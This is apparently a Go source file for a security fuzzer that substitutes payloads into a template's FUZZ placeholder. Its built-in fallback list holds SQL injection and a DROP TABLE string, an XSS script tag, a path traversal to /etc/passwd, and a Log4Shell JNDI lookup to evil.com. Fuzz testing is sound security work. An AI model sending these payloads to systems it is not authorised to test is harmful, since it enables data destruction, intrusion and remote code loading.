package fuzzer

import (
	"bufio"
	"os"
	"strings"
	"sync"
)

// Fuzzer holds a list of payloads and provides methods to mutate strings.
type Fuzzer struct {
	payloads []string
	mu       sync.RWMutex
	index    int
}

// NewFuzzer creates a fuzzer from a payload file (one payload per line).
func NewFuzzer(payloadFile string) (*Fuzzer, error) {
	file, err := os.Open(payloadFile)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var payloads []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			payloads = append(payloads, line)
		}
	}
	if err := scanner.Err(); err != nil {
		return nil, err
	}

	// Add a few built-in payloads if file is empty
	if len(payloads) == 0 {
		payloads = []string{
			"' OR '1'='1",
			"'; DROP TABLE users--",
			"<script>alert(1)</script>",
			"../../../etc/passwd",
			"${jndi:ldap://evil.com/a}",
		}
	}

	return &Fuzzer{payloads: payloads}, nil
}

// Mutate replaces the FUZZ placeholder in a template string with the next payload.
// It cycles through payloads round-robin in a thread-safe way.
func (f *Fuzzer) Mutate(template string) string {
	f.mu.Lock()
	defer f.mu.Unlock()
	
	payload := f.payloads[f.index]
	f.index = (f.index + 1) % len(f.payloads)
	
	return strings.ReplaceAll(template, "FUZZ", payload)
}

// PayloadCount returns the number of loaded payloads.
func (f *Fuzzer) PayloadCount() int {
	return len(f.payloads)
}
